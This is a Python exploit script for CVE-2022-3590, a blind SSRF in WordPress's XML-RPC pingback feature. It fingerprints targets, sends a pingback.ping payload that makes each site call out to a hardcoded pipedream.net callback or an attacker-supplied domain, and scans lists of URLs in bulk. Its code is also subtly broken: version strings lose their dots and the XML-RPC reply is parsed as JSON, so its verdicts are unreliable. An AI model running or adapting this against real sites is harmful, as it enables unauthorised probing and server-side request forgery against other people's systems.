import requests
import json
import urllib.parse
import re
import argparse
from packaging import version

def banner():
    print("   ___  __   __  ___         ___    __    ___   ___         ____  ___   ___    __")
    print("  / __| \ \ / / | __|  ___  |_  )  /  \  |_  ) |_  )  ___  |__ / | __| / _ \  /  \\")
    print(" | (__   \ V /  | _|  |___|  / /  | () |  / /   / /  |___|  |_ \ |__ \ \_, / | () |")
    print("  \___|   \_/   |___|       /___|  \__/  /___| /___|       |___/ |___/  /_/   \__/")
    print("\n")
    print("           ----------------------------------------------")
    print("           | Author:   | @hxlxmj                        |")
    print("           | Github:   | https://github.com/hxlxmjxbbxs |")
    print("           | Released: | 06/12/2023                     |")
    print("           ----------------------------------------------")
    print("\n")

def get_wordpress_version(url):
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'https://' + url 

    try:
        with requests.get(url) as response:
            version_match = re.search('content="WordPress ([^\s]+)', response.text)
    except requests.exceptions.RequestException as e:
        error_message = str(e)
        if "Failed to establish a new connection" in error_message:
            error_message = "Failed to establish a new connection (Connection Issue)"
        print_error(f'An error occurred while getting WordPress version: {error_message}')
        return None

    if version_match:
        version_string = re.sub(r'\D', '', version_match.group(1))
        return version.parse(version_string)
    return None


def is_pingback_enabled(url):
    try:
        with requests.get(url + "/xmlrpc.php?rsd") as response:
            return '<api name="pingback" blogID="1" preferred="false" apiLink="' + url + '/xmlrpc.php?pingback" />' in response.text
    except requests.exceptions.RequestException as e:
        print_error(f'An error occurred while checking pingback feature: {e}')
        return False

def print_info(message, is_vulnerable=False):
    if is_vulnerable:
        print(f"\033[92m[-] {message}\033[0m")
    else:
        print(f"[-] {message}")

def print_error(message):
    print(f"\033[91m[-] {message}\033[0m")

def check_cve_2022_3590(url, domain=None):
    wp_version = get_wordpress_version(url)
    if wp_version and wp_version > version.parse('6.2'):
        print_info(f'{url} is not vulnerable (WordPress version > 6.2).')
        print()
        return

    try:
        if not is_pingback_enabled(url):
            print_info(f'{url} is not vulnerable (Pingback feature is disabled).')
            print()
            return
    except requests.exceptions.RequestException as e:
        error_message = str(e)
        if "Failed to establish a new connection" in error_message:
            error_message = "Failed to establish a new connection (Connection Issue)"
        print_error(f'An error occurred while checking pingback feature: {error_message}')
        print()
        return

    target_url = url + "/xmlrpc.php"

    if not domain:
        domain = 'https://eod51k7v3wd0740.m.pipedream.net'
    pingback_url = 'http://127.0.0.1/'
    payload = f'<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>{pingback_url}</string></value></param><param><value><string>http://{domain}/</string></value></param></params></methodCall>'
    encoded_payload = urllib.parse.quote(payload)

    try:
        response = requests.post(target_url, data=encoded_payload)
        response.raise_for_status()
    except requests.exceptions.HTTPError as e:
        print_info(f'HTTP error occurred: {e}')
        print()
        return
    except requests.exceptions.RequestException as e:
        error_message = str(e)
        if "Failed to establish a new connection" in error_message:
            error_message = "Failed to establish a new connection (Connection Issue)"
        print_error(f'An error occurred: {error_message}')
        print()
        return

    try:
        data = json.loads(response.text)
    except json.decoder.JSONDecodeError:
        data = None

    if data and 'faultCode' in data and data['faultCode'] == 0:
        print_info(f'{url} is vulnerable!', is_vulnerable=True)
    else:
        print_info(f'{url} is not vulnerable.')
    print()

def main():
    banner()
    parser = argparse.ArgumentParser(description="Check if a given WordPress website is vulnerable to the CVE-2022-3590 vulnerability by exploiting the blind SSRF in the pingback feature.")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--url", help="The URL of the WordPress website to check")
    group.add_argument("-f", "--file", help="A file containing a list of URLs of WordPress websites to check")
    parser.add_argument("-d", "--domain", help="The domain controlled by the attacker")
    args = parser.parse_args()

    if args.file:
        with open(args.file, 'r') as file:
            urls = [url.strip() for url in file.readlines()]
        for url in urls:
            check_cve_2022_3590(url, args.domain)
    else:
        check_cve_2022_3590(args.url, args.domain)

if __name__ == "__main__":
    main()
